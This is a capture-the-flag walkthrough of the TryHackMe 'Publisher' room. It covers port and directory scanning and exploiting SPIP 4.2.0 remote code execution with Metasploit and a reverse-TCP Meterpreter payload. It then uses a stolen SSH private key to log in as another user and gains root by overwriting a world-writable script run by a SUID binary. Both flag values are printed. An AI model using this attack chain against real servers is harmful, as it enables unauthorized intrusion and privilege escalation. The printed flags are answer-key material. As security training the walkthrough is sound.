# Publisher

Room: [https://tryhackme.com/room/publisher](https://tryhackme.com/room/publisher)

---

# 1. Initial Enumeration

The first step when approaching any target machine is **port scanning** to discover exposed services.
I started by running **Nmap**:

```bash
nmap -sC -oN nmap.txt 10.49.174.226
```
The `-sC` flag runs default scripts that help identify service information.

### Result

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Two ports were open:

---

# 2. Web Enumeration

Next, I visited the web application:

```
http://10.49.174.226
```

I performed some basic checks:

* viewed page source
* checked `robots.txt`

Nothing interesting appeared.

---

# 3. Directory Bruteforcing

Since manual inspection did not reveal much, I performed **directory enumeration** using **Gobuster**.

```bash
gobuster dir -u http://10.49.174.226/ -w /usr/share/wordlists/dirb/big.txt
```
Directory brute forcing helps discover **hidden endpoints or admin panels**.

### Result

```
/images
/spip
```

The `/spip` directory looked particularly interesting.

---

# 4. Enumerating the SPIP Application

I ran Gobuster again on the `/spip` directory.

```bash
gobuster dir -u http://10.49.174.226/spip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
```

Among the results, I found:

```
htaccess.txt
```

Opening this file revealed the **SPIP version**.
SPIP is a **PHP-based CMS**. Knowing the version allows us to search for **known vulnerabilities**.

The version discovered was:

```
SPIP 4.2.0
```

---

# 5. Searching for Vulnerabilities

After identifying the version, I searched online for vulnerabilities affecting **SPIP 4.2**.
I discovered that this version is vulnerable to **Remote Code Execution (RCE)**.
To exploit this, I used the **Metasploit Framework**.

---

# 6. Exploiting SPIP RCE

I launched Metasploit:

```bash
msfconsole
```

Then searched for SPIP exploits:

```bash
search spip
```

I found the module:

```
exploit/multi/http/spip_rce_form
```

### Exploit Setup

```bash
use exploit/multi/http/spip_rce_form
set RHOSTS 10.49.174.226
set TARGETURI /spip
set PAYLOAD php/meterpreter/reverse_tcp
run
```
This exploit abuses a vulnerable SPIP form to execute **arbitrary PHP code**, allowing us to obtain a shell on the server.
A **Meterpreter session** was successfully opened.

---

## 7. Gaining a Shell

After the exploit succeeded, a **Meterpreter session** was opened. I then spawned a system shell:

```bash
meterpreter > shell
```
This created a system shell running as the web server user.

```bash
whoami
www-data
```
Web exploits usually give access as the **web server user (`www-data`)**, which typically has limited privileges.

---

## 8. Finding the User Flag

While exploring the file system, I noticed the working directory was inside the **SPIP web directory**.

```bash
pwd
/home/think/spip/spip
```
I moved up the directory tree to the home directory of the **think** user:

```bash
cd ../../
ls
```
This revealed a file called:

```text
user.txt
```
I read the file:

```bash
cat user.txt
```
### User Flag

```text
fa229046d44eda6a3598c73ad96f4ca5
```

---


# 9. Finding Sensitive Files

While exploring the system, I navigated to the home directory of the user **think**:

```
/home/think/.ssh
```

Inside the directory I found:

```
id_rsa
```
This file contained a **private SSH key**.

### Concept
SSH private keys allow passwordless authentication. If exposed, they can allow attackers to **log in as another user**.

---

# 10. SSH Access

I copied the private key to my machine and attempted to connect via SSH.
Initially, SSH refused the key because of incorrect permissions.

```
Permissions 0664 for 'id_rsa' are too open
```
To fix this:

```bash
chmod 600 id_rsa
```
Then connected again:

```bash
ssh -i id_rsa think@10.49.174.226
```
This successfully logged me in as the user:

```
think
```

---

# 10. Privilege Escalation Enumeration

After gaining access as **think**, I started enumerating the system.

First I checked sudo privileges:

```bash
sudo -l
```

However, this required a password which we did not have.

---

# 11. Searching for Writable Directories

Next, I searched for **writable directories**:

```bash
find / -type d -writable 2>/dev/null
```

One interesting location appeared:

```
/dev/shm
```
Writable directories are important because attackers can place **malicious files or scripts** there.

---

# 12. Searching for SUID Binaries

Another common privilege escalation technique is to look for **SUID binaries**.

```bash
find / -perm -4000 -type f 2>/dev/null
```
SUID binaries run with the **permissions of the file owner**, usually root.
If misconfigured, they can lead to **privilege escalation**.
Among the results, I found a suspicious binary:

```
/usr/sbin/run_container
```

---

# 13. Inspecting the SUID Binary

Checking its permissions:

```bash
ls -l /usr/sbin/run_container
```

```
-rwsr-sr-x 1 root root 16760
```

This confirms:

* owned by **root**
* **SUID bit enabled**
* executable by any user

Meaning the program runs **with root privileges**.

---

# 14. Analyzing the Binary

I inspected the binary using:

```bash
strings /usr/sbin/run_container
```

This revealed:

```
/bin/bash
/opt/run_container.sh
```
The binary executes a **bash script located at `/opt/run_container.sh`**.
Because the binary runs as root, the script will also execute **with root privileges**.

---

# 15. Checking Script Permissions

Next I inspected the script:

```bash
ls -l /opt/run_container.sh
```

Result:

```
-rwxrwxrwx
```

This means the script is **world-writable**.
If a script executed by a **root SUID binary** is writable by other users, attackers can modify it to execute arbitrary commands as root.

---

# 16. Exploiting the Misconfiguration

I edited the script:

```bash
nano /opt/run_container.sh
```

Then replaced its contents with:

```bash
#!/bin/bash
cat /root/root.txt
```
This command simply reads the **root flag**.
```
3a4225cc9e85709adda6ef55d6a4f2ca
```

DONE!!!!!!
